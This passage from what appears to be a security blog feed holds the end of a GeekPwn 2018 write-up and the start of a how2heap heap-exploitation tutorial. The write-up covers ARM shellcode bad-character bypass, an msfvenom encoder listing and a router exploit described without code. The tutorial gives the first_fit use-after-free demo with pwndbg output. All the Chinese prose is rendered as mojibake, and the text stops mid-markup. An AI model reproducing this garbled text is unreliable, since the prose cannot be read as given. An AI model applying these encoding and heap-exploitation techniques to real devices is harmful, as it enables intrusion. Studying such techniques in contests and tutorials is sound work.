å¤§æ³•å¥½ï¼</p><p>ç„¶åå‘ç°äº†å‡ ç¯‡æŒºå¥½çš„æ–‡ç« ï¼š</p><p><a href="http://phrack.org/issues/66/12.html">http://phrack.org/issues/66/12.html</a></p><p><a href="https://azeria-labs.com/writing-arm-shellcode/">https://azeria-labs.com/writing-arm-shellcode/</a></p><h4 id="badchar-bypass"><a href="#badchar-bypass" class="headerlink" title="badchar bypass"></a>badchar bypass</h4><p>ç”±äºæ˜¯è¾“å…¥çš„è¿‡ç¨‹ä¸­ sscanf éœ€è¦ bypass ä¸€äº› badchar ï¼Œä¾‹å¦‚ \x00 \x20 è¯¸å¦‚æ­¤ç±»â€¦äºæ˜¯æˆ‘ä»¬åˆšå¼€å§‹èƒ½ä¸èƒ½æœ‰ç°æœ‰çš„ç¼–ç å™¨å¯ä»¥ encodeä¸€ä¸‹ï¼ï¼ï¼</p><p>ä¾‹å¦‚ï¼š msfvenom ç„¶åæƒŠå¥‡çš„å‘ç°ï¼ï¼ï¼æ²¡æœ‰ armçš„ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l encoders</span><br><span class="line"></span><br><span class="line">Framework Encoders</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">    Name                          Rank       Description</span><br><span class="line">    ----                          ----       -----------</span><br><span class="line">    cmd/<span class="built_in">echo</span>                      good       Echo Command Encoder</span><br><span class="line">    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder</span><br><span class="line">    cmd/ifs                       low        Generic <span class="variable">$&#123;IFS&#125;</span> Substitution Command Encoder</span><br><span class="line">    cmd/perl                      normal     Perl Command Encoder</span><br><span class="line">    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder</span><br><span class="line">    cmd/printf_php_mq             manual     <span class="built_in">printf</span>(1) via PHP magic_quotes Utility Command Encoder</span><br><span class="line">    generic/eicar                 manual     The EICAR Encoder</span><br><span class="line">    generic/none                  normal     The <span class="string">&quot;none&quot;</span> Encoder</span><br><span class="line">    mipsbe/byte_xori              normal     Byte XORi Encoder</span><br><span class="line">    mipsbe/longxor                normal     XOR Encoder</span><br><span class="line">    mipsle/byte_xori              normal     Byte XORi Encoder</span><br><span class="line">    mipsle/longxor                normal     XOR Encoder</span><br><span class="line">    php/base64                    great      PHP Base64 Encoder</span><br><span class="line">    ppc/longxor                   normal     PPC LongXOR Encoder</span><br><span class="line">    ppc/longxor_tag               normal     PPC LongXOR Encoder</span><br><span class="line">    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder</span><br><span class="line">    x64/xor                       normal     XOR Encoder</span><br><span class="line">    x64/zutto_dekiru              manual     Zutto Dekiru</span><br><span class="line">    x86/add_sub                   manual     Add/Sub Encoder</span><br><span class="line">    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder</span><br><span class="line">    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder</span><br><span class="line">    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower</span><br><span class="line">    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower</span><br><span class="line">    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder</span><br><span class="line">    x86/bmp_polyglot              manual     BMP Polyglot</span><br><span class="line">    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder</span><br><span class="line">    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder</span><br><span class="line">    x86/context_stat              manual     <span class="built_in">stat</span>(2)-based Context Keyed Payload Encoder</span><br><span class="line">    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder</span><br><span class="line">    x86/countdown                 normal     Single-byte XOR Countdown Encoder</span><br><span class="line">    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder</span><br><span class="line">    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder</span><br><span class="line">    x86/nonalpha                  low        Non-Alpha Encoder</span><br><span class="line">    x86/nonupper                  low        Non-Upper Encoder</span><br><span class="line">    x86/opt_sub                   manual     Sub Encoder (optimised)</span><br><span class="line">    x86/service                   manual     Register Service</span><br><span class="line">    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder</span><br><span class="line">    x86/single_static_bit         manual     Single Static Bit</span><br><span class="line">    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder</span><br><span class="line">    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</span><br><span class="line"></span><br><span class="line">ä½œè€…ï¼šæå®¢åœˆ</span><br><span class="line">é“¾æ¥ï¼šhttps://www.jianshu.com/p/d0d795eaf429</span><br><span class="line">ä¾†æºï¼šç®€ä¹¦</span><br><span class="line">ç®€ä¹¦è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ï¼Œä»»ä½•å½¢å¼çš„è½¬è½½éƒ½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒå¹¶æ³¨æ˜å‡ºå¤„ã€‚</span><br></pre></td></tr></table></figure><p>emmm å¥½å§æ‰‹å†™æ‰‹å†™ï¼</p><p>äºæ˜¯æˆ‘å’Œä¼¯åšå†³å®šï¼Œå“ªé‡Œä¸è¡Œç‚¹å“ªé‡Œâ€¦ è¿™ä¸ªæŒ‡ä»¤ä¸è¡Œ å°±æ¢ä¸¤ä¸ªæŒ‡ä»¤ åŠ©å¦‚æ­¤ç±»â€¦</p><h4 id="exploit-done"><a href="#exploit-done" class="headerlink" title="exploit done !!!"></a>exploit done !!!</h4><p>emm </p><p><a href="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115143105.png" class="gallery-item"><img src="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115143105.png"></a></p><p>ç„¶è€Œè¿™ä¸ªæ—¶å€™ã€‚ã€‚æˆ‘ä»¬å‘ç°è™šæ‹Ÿæœºæ‰“é€šäº† è®¾å¤‡æ‰“ä¸é€šï¼ åé¢æ‰å‘ç° emm watch dog åœ¨ï¼Œæ‰“äº†ä¹‹åå°±å´©äº†ï¼ï¼ï¼æœ€åä¼¯åšå†™å‡ºäº† æƒ…ç†ä¹‹ä¸­ï¼Œç†æ‰€åº”å½“çš„exploit</p><p><a href="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115143331.png" class="gallery-item"><img src="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115143331.png"></a></p><p>woc ï¼Ÿï¼Ÿï¼Ÿ å¥½å§ å†™åˆ°å¼€æœºå¯åŠ¨é‡Œ</p><p>ï¼ˆps ï¼šå¦å¤–ä¸€ä¸ªè·¯ç”±å™¨çš„ ä»»æ„å‘½ä»¤æ‰§è¡Œå°±ä¸å†™äº†â€¦æ²¡ä»€ä¹ˆå‘ç‚¹ï¼‰</p><h3 id="0x03-GeekPwn-Shang-Hai"><a href="#0x03-GeekPwn-Shang-Hai" class="headerlink" title="0x03 GeekPwn Shang Hai"></a>0x03 GeekPwn Shang Hai</h3><p>å’•å’• ä¼¯åšâ€¦è¯´å¥½çš„æ¥ä¸Šæµ·çš„å‘¢ï¼Ÿï¼Ÿï¼Ÿ è¢«å’•å’•äº†â€¦</p><h4 id="ç­¾åˆ°ï¼š"><a href="#ç­¾åˆ°ï¼š" class="headerlink" title="ç­¾åˆ°ï¼š"></a>ç­¾åˆ°ï¼š</h4><p>ç­¾åˆ°è¦æ‹ç…§ç‰‡â€¦å…ˆæ˜¯å›¢é˜Ÿ ï¼Œå¯¹äº†æˆ‘ä»¬çš„å›¢é˜Ÿå« ï¼šå°çŒªçŸ¿ä¸» â€¦</p><p>ç„¶åç´§æ¥ç€æ˜¯ ä¸ªäººç…§â€¦åœ¨ä¸ªäººç…§çš„æ—¶å€™ï¼Œæ‘„å½±å¸ˆä¼šé—®ä½ ï¼Œæœ‰ä¸ªäººPoseä¹ˆï¼Ÿwoc éº¦é¦™å¸ˆå‚…çœŸçš„æ˜¯å¤ªå¸…äº† èˆ”ä¸€æ³¢ï¼ŒAtumå¸ˆå‚…å¤ªå¼ºäº†â€¦</p><p>ç„¶åæ‹¿äº†è¡£æœå’Œèƒ¸ç‰Œå°±æ’¤äº†..</p><p><a href="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115144021.png" class="gallery-item"><img src="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115144021.png"></a></p><h4 id="ç¬¬ä¸€å¤©ï¼š"><a href="#ç¬¬ä¸€å¤©ï¼š" class="headerlink" title="ç¬¬ä¸€å¤©ï¼š"></a>ç¬¬ä¸€å¤©ï¼š</h4><p>æˆ‘ä»¬çš„æ¯”èµ›æ”¾åœ¨ ç¬¬äºŒå¤©ä¸‹åˆï¼Œæ‰€ä»¥ç¬¬ä¸€å¤©æˆ‘ä»¬æ˜¯è§‚ä¼—ã€‚ã€‚ã€‚</p><p>ç¬¬ä¸€å¤©è§åˆ°äº† è’‹æ˜Œå»ºè€å¸ˆï¼Œè’‹æ˜Œå»ºè€å¸ˆçš„ ä¸»æŒä¸€å¦‚æ—¢å¾€ æœ€å¼ºå¤§è„‘å³æ—¶æ„Ÿï¼ã€‚</p><p><a href="http://2018.geekpwn.org/images/collection/18.jpeg" class="gallery-item"><img src="http://2018.geekpwn.org/images/collection/18.jpeg"></a></p><p>å½“äº†ä¸€å¤©è§‚ä¼— â€¦æœ‰å‡ ä¸ªé¡¹ç›®æŒºæœ‰æ„æ€â€¦</p><p>ä¸­åˆ Atumè€æ¿å’Œ ä»–çš„è€æ¿å‡ºå»åƒé¥­äº†â€¦</p><p>æ™šä¸Š kj è€æ¿å¸¦æˆ‘ä»¬å»åƒé¥­äº†â€¦ç„¶åè°ˆäº†ä¸€ç‚¹ï¼Œä»–ä¹‹åçš„æƒ³æ³•..</p><p>ç„¶åå„å›å„å®¶ï¼Œå›å»æ¥ç€ æµ‹è¯•è®¾å¤‡â€¦</p><h4 id="ç¬¬äºŒå¤©"><a href="#ç¬¬äºŒå¤©" class="headerlink" title="ç¬¬äºŒå¤©"></a>ç¬¬äºŒå¤©</h4><p>ç¬¬äºŒå¤©æ—©ä¸Šï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰å»ç°åœºï¼Œç”±äºä¸‹åˆå°±æ˜¯æˆ‘ä»¬çš„æ¯”èµ›äº†,æˆ‘ä»¬åˆå¼€å§‹æµ‹äº†ä¸€æ¬¡è®¾å¤‡ï¼Œemmm ä¸­é—´çš„ç¡®é¿å…äº†è®¸å¤šéº»çƒ¦ï¼Œç”±äºæœ€åçš„exploitéƒ½æ˜¯ç”¨shell è„šæœ¬å†™çš„..æˆ‘ä»¬çš„å¾—å…ˆç¡®è®¤ä¸€é</p><p>ä¸‹åˆæ¯”èµ›å¼€å§‹ï¼š</p><p>ä¸­é—´åŸæœ¬è®¾è®¡å¥½çš„ å›è½¦æ—¥ç«™å¤±æ•ˆäº†ï¼ï¼ï¼</p><p>ä¸€å¼€å§‹æ˜¯ æŸéŸ³ç®±æ²¡è¿wifiï¼Œ è·ªäº†ï¼Œæ‰“ä¸åˆ°</p><p>åé¢æ˜¯æŸæ¬¾è·¯ç”±å™¨çš„å›½å†…ç‰ˆå’Œå›½é™…ç‰ˆå¼„åäº†ï¼ è·ªäº†</p><p>æœ€åï¼Œåˆå‘ç° è·¯ç”±å™¨çš„åœ°å€å¡«é”™äº†ï¼Œè·ªäº†ï¼ï¼ï¼</p><p>äºæ˜¯ä¹ï¼Œç°åœºæ”¹ exploitâ€¦.åœ¨æœ€åçš„å››ç§’ PWNEDï¼</p><p><a href="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115145501.png" class="gallery-item"><img src="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115145501.png"></a></p><p><a href="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115144903.png" class="gallery-item"><img src="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115144903.png"></a></p><p>é‚£ä¸ªå”¯ä¸€å‡ºç°åœ¨ PPT ä¸Šçš„ç”·äºº @w1ther ï¼Œè®©ä½ å’•å’•ï¼</p><h4 id="é¢å¥–"><a href="#é¢å¥–" class="headerlink" title="é¢å¥–"></a>é¢å¥–</h4><p>æœ€åé¢å¥–çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ‹¿äº†ä¸¤ä¸ª ä¸€ä¸ªæœ€ä½³å±•ç¤º ä¸€ä¸ªæ˜¯åŸºäºæ¼æ´æ”»ç ´å¥–ã€‚</p><p><a href="http://s.plusx.cn/plus/immediate/381118/20181025181543780/09560428_b.JPG?sign=f9c3baba79cfc05a536711baeb003899&t=5bee6748" class="gallery-item"><img src="http://s.plusx.cn/plus/immediate/381118/20181025181543780/09560428_b.JPG?sign=f9c3baba79cfc05a536711baeb003899&t=5bee6748"></a></p><h3 id="æœ€åçš„æœ€å"><a href="#æœ€åçš„æœ€å" class="headerlink" title="æœ€åçš„æœ€å"></a>æœ€åçš„æœ€å</h3><p>æ„Ÿè°¢ kj è€æ¿ï¼ ä¹Ÿæ„Ÿè°¢é˜Ÿå‹ä»¬ï¼ï¼ï¼ tql äº†</p><p>è´´ä¸ªå‡ºé“ç…§ç‰‡å§</p><p><a href="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115145926.png" class="gallery-item"><img src="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115145926.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> geekpwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Educational Heap Exploitation</title>
      <link href="Educational_Heap_Exploitation.html"/>
      <url>Educational_Heap_Exploitation.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>é€šè¿‡ how2heap å¤ä¹ å †åˆ©ç”¨</p><p>é¦–å‘äºå…ˆçŸ¥ç¤¾åŒº <a href="https://xz.aliyun.com/t/2582">https://xz.aliyun.com/t/2582</a></p><h2 id="Educational-Heap-Exploitation"><a href="#Educational-Heap-Exploitation" class="headerlink" title="Educational Heap Exploitation"></a>Educational Heap Exploitation</h2><p><a href="https://github.com/shellphish/how2heap">how2heap</a>è¿™æ˜¯ç”± shellphish å›¢é˜Ÿåˆ›å»ºçš„ä¸€ä¸ªä»“åº“ï¼Œæ˜¯ç”¨æ¥å­¦ä¹ å †åˆ©ç”¨æŠ€æœ¯å¹¿ä¸ºå‘¨çŸ¥çš„åœ°æ–¹ã€‚    ä¸”ä¸»è¦é’ˆå¯¹ glibc</p><h3 id="0x01-first-fit"><a href="#0x01-first-fit" class="headerlink" title="0x01 first_fit"></a>0x01 first_fit</h3><p>Source:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file doesn&#x27;t demonstrate an attack, but shows the nature of glibc&#x27;s allocator.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;glibc uses a first-fit algorithm to select a free chunk.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If a chunk is free and large enough, malloc will select this chunk.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This can be exploited in a use-after-free situation.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 2 buffers. They can be large, don&#x27;t have to be fastbin.\n&quot;</span>);</span><br><span class="line"><span class="keyword">char</span>* a = <span class="built_in">malloc</span>(<span class="number">512</span>);</span><br><span class="line"><span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line"><span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(512): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(256): %p\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;we could continue mallocing here...\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;now let&#x27;s put a string at a that we can read later \&quot;this is A!\&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(a, <span class="string">&quot;this is A!&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We don&#x27;t need to free anything again. As long as we allocate less than 512, it will end up at %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, let&#x27;s allocate 500 bytes\n&quot;</span>);</span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(500): %p\n&quot;</span>, c);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And put a different string here, \&quot;this is C!\&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(c, <span class="string">&quot;this is C!&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd allocation %p points to %s\n&quot;</span>, c, c);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we reuse the first allocation, it now holds the data from the third allocation.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä»è°ƒè¯•ä¸Šå…¥æ‰‹ï¼Œé¦–å…ˆç®€å•å¯¹ main å‡½æ•°ä¸‹æ–­ç‚¹ã€‚<code>b main</code> ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814152947.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814152947.png"></a></p><p>ç¨‹åºé¦–å…ˆåˆ›å»ºäº†ä¸¤ä¸ª chunkï¼Œsizeåˆ†åˆ«ä¸º 512 å’Œ256ã€‚ç„¶åå‘chunk a  åˆ†åˆ«å†™å…¥å­—ç¬¦ä¸² â€˜this is Aâ€™ ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0x602320</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0x602000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x211,</span><br><span class="line">  fd = 0x2073692073696874,</span><br><span class="line">  bk = 0x2141,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/20a 0x602000</span><br><span class="line">0x602000:0x00x211</span><br><span class="line">0x602010:0x20736920736968740x2141</span><br><span class="line">0x602020:0x00x0</span><br><span class="line">0x602030:0x00x0</span><br><span class="line">0x602040:0x00x0</span><br><span class="line">0x602050:0x00x0</span><br><span class="line">0x602060:0x00x0</span><br><span class="line">0x602070:0x00x0</span><br><span class="line">0x602080:0x00x0</span><br><span class="line">0x602090:0x00x0</span><br><span class="line">Pwndbg&gt; x/5s 0x602010</span><br><span class="line">0x602010:<span class="string">&quot;this is A!&quot;</span></span><br><span class="line">0x60201b:<span class="string">&quot;&quot;</span></span><br><span class="line">0x60201c:<span class="string">&quot;&quot;</span></span><br><span class="line">0x60201d:<span class="string">&quot;&quot;</span></span><br><span class="line">0x60201e:</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬æŠŠ chunk A freeæ‰ã€‚ç”±äºchunk A å¤§å°ä¸º 512 ä¸é€‚äº fastbins ç³»ç»Ÿä¼šå°†è¿™ä¸ªchunk æ”¾å…¥unsortedbinã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814154134.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814154134.png"></a></p><hr><p>åŸºæœ¬æ¥æºï¼š</p><ol><li>å½“ä¸€ä¸ªè¾ƒå¤§çš„ chunk è¢«åˆ†å‰²æˆä¸¤åŠåï¼Œå¦‚æœå‰©ä¸‹çš„éƒ¨åˆ†å¤§äº MINSIZEï¼Œå°±ä¼šè¢«æ”¾åˆ° unsorted bin ä¸­ã€‚</li><li>é‡Šæ”¾ä¸€ä¸ªä¸å±äº fast bin çš„ chunkï¼Œå¹¶ä¸”è¯¥ chunk ä¸å’Œ top chunk ç´§é‚»æ—¶ï¼Œè¯¥ chunk ä¼šè¢«é¦–å…ˆæ”¾åˆ° unsorted bin ä¸­ã€‚å…³äºtop chunkçš„è§£é‡Šï¼Œè¯·å‚è€ƒä¸‹é¢çš„ä»‹ç»ã€‚</li><li>å½“è¿›è¡Œ malloc_consolidate æ—¶ï¼Œå¯èƒ½ä¼šæŠŠåˆå¹¶åçš„ chunk æ”¾åˆ° unsorted bin ä¸­ï¼Œå¦‚æœä¸æ˜¯å’Œ top chunk è¿‘é‚»çš„è¯ã€‚</li></ol><p>åŸºæœ¬ä½¿ç”¨æƒ…å†µ</p><ol><li>Unsorted Bin åœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ï¼Œé‡‡ç”¨çš„éå†é¡ºåºæ˜¯ FIFOï¼Œ<strong>å³æ’å…¥çš„æ—¶å€™æ’å…¥åˆ° unsorted bin çš„å¤´éƒ¨ï¼Œå–å‡ºçš„æ—¶å€™ä»é“¾è¡¨å°¾è·å–</strong>ã€‚</li><li>åœ¨ç¨‹åº malloc æ—¶ï¼Œå¦‚æœåœ¨ fastbinï¼Œsmall bin ä¸­æ‰¾ä¸åˆ°å¯¹åº”å¤§å°çš„ chunkï¼Œå°±ä¼šå°è¯•ä» Unsorted Bin ä¸­å¯»æ‰¾ chunkã€‚å¦‚æœå–å‡ºæ¥çš„ chunk å¤§å°åˆšå¥½æ»¡è¶³ï¼Œå°±ä¼šç›´æ¥è¿”å›ç»™ç”¨æˆ·ï¼Œå¦åˆ™å°±ä¼šæŠŠè¿™äº› chunk åˆ†åˆ«æ’å…¥åˆ°å¯¹åº”çš„ bin ä¸­ã€‚</li></ol><hr><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814154346.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814154346.png"></a></p><p> å½“ç¨‹åºå†ä¸€æ¬¡ malloc ä¸€ä¸ªå¤§å°ä¸æˆ‘ä»¬ free æ‰çš„chunk å¤§å°å·®ä¸å¤šçš„ chunk ï¼Œç³»ç»Ÿä¼šä¼˜å…ˆä» bins é‡Œæ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„ chunk æŠŠä»–å–å‡ºæ¥å†ä½¿ç”¨ã€‚å†™å…¥â€™this is Câ€™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; heap</span><br><span class="line">Top Chunk: <span class="number">0x602320</span></span><br><span class="line">Last Remainder: <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x602000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x211</span>,</span><br><span class="line">  fd = <span class="number">0x2073692073696874</span>,</span><br><span class="line">  bk = <span class="number">0x7ffff7002143</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/20a 0x602000</span><br><span class="line">0x602000:0x00x211</span><br><span class="line">0x602010:0x20736920736968740x7ffff7002143</span><br><span class="line">0x602020:0x00x0</span><br><span class="line">0x602030:0x00x0</span><br><span class="line">0x602040:0x00x0</span><br><span class="line">0x602050:0x00x0</span><br><span class="line">0x602060:0x00x0</span><br><span class="line">0x602070:0x00x0</span><br><span class="line">0x602080:0x00x0</span><br><span class="line">0x602090:0x00x0</span><br><span class="line">Pwndbg&gt; x/5s 0x602010</span><br><span class="line">0x602010:<span class="string">&quot;this is C!&quot;</span></span><br><span class="line">0x60201b:<span class="string">&quot;\367\377\177&quot;</span></span><br><span class="line">0x60201f:<span class="string">&quot;&quot;</span></span><br><span class="line">0x602020:<span class="string">&quot;&quot;</span></span><br><span class="line">0x602021:<span class="string">&quot;&quot;</span></span><br><span 